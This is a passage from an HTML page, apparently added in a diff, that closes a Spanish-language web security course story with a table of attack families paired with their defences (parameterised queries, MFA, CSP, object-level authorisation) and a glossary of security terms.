+   LA PREGUNTA QUE EXPLOTA CADA FAMILIA:
+   ┌───────────┬────────────┬──────────┬──────────────┬───────────────┐
+   │ ¿Separa   │ ¿Esto me   │ ¿Quién   │ ¿Confía de   │ ¿Sigo yo las  │
+   │ datos de  │ corres-    │  soy?    │ más en rutas/│  reglas?      │
+   │ código?   │ ponde?     │          │ archivos?    │               │
+   │ Inyección │ Acceso     │ Auth     │ Config       │ Lógica negocio│
+   └───────────┴────────────┴──────────┴──────────────┴───────────────┘
+</code></pre>
+<hr />
+<h2>✅ Cuadro resumen final</h2>
+<table>
+<thead>
+<tr>
+<th>Acto</th>
+<th>Tema</th>
+<th>Ataque estrella</th>
+<th>Defensa de oro</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Arquitectura y HTTP</td>
+<td>(base) manipular parámetros/métodos</td>
+<td>Validar en el backend</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Reconocimiento</td>
+<td>Enumeración (subdominios, puertos, rutas)</td>
+<td>Reducir superficie, no exponer de más</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Interceptación</td>
+<td>Fuerza bruta / diccionario</td>
+<td>Rate limiting, MFA, lockout</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Reporte y CVSS</td>
+<td>(medir, no atacar)</td>
+<td>Comunicar impacto + CVSS</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Misconfiguration</td>
+<td><code>.env</code>/<code>.git</code> filtrados, path traversal, CORS</td>
+<td>Endurecer config, headers, ocultar errores</td>
+</tr>
+<tr>
+<td>6</td>
+<td>Acceso / Auth</td>
+<td>IDOR + JWT forjado + escalada</td>
+<td>Autorizar por objeto en el server; IDs opacos</td>
+</tr>
+<tr>
+<td>7</td>
+<td>Lógica de negocio</td>
+<td>Race conditions (single-packet)</td>
+<td>Validar flujo y estado, operaciones atómicas</td>
+</tr>
+<tr>
+<td>8</td>
+<td>Inyección</td>
+<td>SQLi (UNION / blind)</td>
+<td>Consultas preparadas + whitelist</td>
+</tr>
+<tr>
+<td>9</td>
+<td>XSS</td>
+<td>Stored XSS → robo de sesión</td>
+<td>Output encoding, CSP, DOMPurify</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>La madre de todas las preguntas, otra vez:</strong> <em>¿el servidor está confiando en algo que controla el usuario, sin verificarlo?</em></p>
+</blockquote>
+<hr />
+<h2>📖 Glosario (del curso)</h2>
+<p><strong>Autenticación:</strong> probar quién sos. · <strong>Autorización:</strong> chequear qué podés hacer. · <strong>2FA/MFA:</strong> validar con dos+ factores (algo que sabés + algo que tenés). · <strong>Pentesting:</strong> simulación autorizada de un ataque. · <strong>Hacking Ético:</strong> auditoría ofensiva legal y con permiso. · <strong>Scope:</strong> lo que te autorizan a atacar. · <strong>Proxy:</strong> intermediario que ve/edita el tráfico (Burp). · <strong>MitM (Man-in-the-Middle):</strong> interponerse en una comunicación. · <strong>Payload:</strong> la carga/código del ataque. · <strong>Hashing:</strong> función de una sola vía que da una huella fija (integridad). · <strong>Salt:</strong> valor random que se agrega antes de hashear. · <strong>Entropía:</strong> cuán impredecible es un secreto. · <strong>Token / Cookie de sesión:</strong> tu pase mientras estás logueada. · <strong>JWT:</strong> token de 3 partes (header.payload.firma). · <strong>IDOR / BOLA:</strong> acceder a un objeto ajeno cambiando su ID. · <strong>Escalada horizontal/vertical:</strong> a otra cuenta igual / a un rol mayor. · <strong>CSRF:</strong> forzar a la víctima logueada a disparar una acción. · <strong>XSS:</strong> inyectar JS que corre en el navegador de otro. · <strong>SQLi:</strong> inyectar SQL en una consulta. · <strong>WAF:</strong> firewall de aplicaciones web. · <strong>CVE:</strong> una vulnerabilidad concreta publicada. · <strong>CWE:</strong> un tipo de debilidad. · <strong>CVSS:</strong> puntaje 0–10 de gravedad. · <strong>CIA/CID:</strong> Confidencialidad, Integridad, Disponibilidad. · <strong>ASVS:</strong> checklist de verificación de seguridad de OWASP. · <strong>DDoS:</strong> saturar un servicio para tirarlo. · <strong>Buffer Overflow:</strong> volcar más datos que el espacio en memoria para ejecutar código. · <strong>Zero-Day:</strong> vulnerabilidad sin parche conocido. · <strong>Backdoor:</strong> acceso oculto que saltea la autenticación. · <strong>Phishing:</strong> engaño por suplantación para robar credenciales. · <strong>Ransomware:</strong> malware que cifra datos y pide rescate. · <strong>Botnet:</strong> red de equipos infectados (C2). · <strong>Exploit:</strong> código que aprovecha una debilidad. · <strong>Defensa en profundidad:</strong> varias capas de seguridad. · <strong>Whitelisting:</strong> permitir solo lo explícitamente autorizado. · <strong>VPN:</strong> túnel cifrado sobre redes públicas. · <strong>OWASP:</strong> fundación de seguridad web (Top 10, ASVS).</p>
+<hr />
+<p><em>Cuento didáctico del curso Software Seguro — Curso Profesional de Ciberseguridad Web y Ethical Hacking. Uso educativo y de repaso personal.</em></p></body></html>
